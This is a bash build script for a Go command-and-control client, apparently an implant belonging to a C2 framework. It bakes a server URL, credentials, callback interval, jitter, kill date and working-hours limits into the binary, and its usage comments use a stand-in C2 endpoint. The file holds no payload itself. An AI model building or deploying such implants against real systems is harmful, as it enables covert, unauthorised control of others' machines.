#!/bin/bash
# Build C2 Go client with optional embedded config (ldflags).
# Usage:
#   ./build_client.sh
#   SERVER_URL=wss://c2.example.com/live CLIENT_ID=myid CLIENT_SECRET=secret ./build_client.sh
#   ./build_client.sh wss://c2.example.com/live myid mysecret
set -e
cd "$(dirname "$0")/.."
CLIENT_DIR="$(pwd)/client"
OUT="${CLIENT_DIR}/client"
if [ -n "$1" ]; then
  export SERVER_URL="${1:-$SERVER_URL}"
  export CLIENT_ID="${2:-$CLIENT_ID}"
  export CLIENT_SECRET="${3:-$CLIENT_SECRET}"
  export CALLBACK_INTERVAL="${4:-$CALLBACK_INTERVAL}"
  export JITTER_PERCENT="${5:-$JITTER_PERCENT}"
  export KILL_DATE="${6:-$KILL_DATE}"
  export WORKING_HOURS_START="${7:-$WORKING_HOURS_START}"
  export WORKING_HOURS_END="${8:-$WORKING_HOURS_END}"
fi
LDFLAGS=""
[ -n "$SERVER_URL" ] && LDFLAGS="$LDFLAGS -X main.defaultServerURL=$SERVER_URL"
[ -n "$CLIENT_ID" ] && LDFLAGS="$LDFLAGS -X main.defaultClientID=$CLIENT_ID"
[ -n "$CLIENT_SECRET" ] && LDFLAGS="$LDFLAGS -X main.defaultClientSecret=$CLIENT_SECRET"
[ -n "$CALLBACK_INTERVAL" ] && LDFLAGS="$LDFLAGS -X main.defaultCallbackIntervalSec=$CALLBACK_INTERVAL"
[ -n "$JITTER_PERCENT" ] && LDFLAGS="$LDFLAGS -X main.defaultJitterPercent=$JITTER_PERCENT"
[ -n "$KILL_DATE" ] && LDFLAGS="$LDFLAGS -X main.defaultKillDate=$KILL_DATE"
[ -n "$WORKING_HOURS_START" ] && LDFLAGS="$LDFLAGS -X main.defaultWorkingHoursStart=$WORKING_HOURS_START"
[ -n "$WORKING_HOURS_END" ] && LDFLAGS="$LDFLAGS -X main.defaultWorkingHoursEnd=$WORKING_HOURS_END"
echo "Building client in $CLIENT_DIR..."
(cd "$CLIENT_DIR" && go build -o client ${LDFLAGS:+ -ldflags "$LDFLAGS"} .)
echo "Built: $OUT"
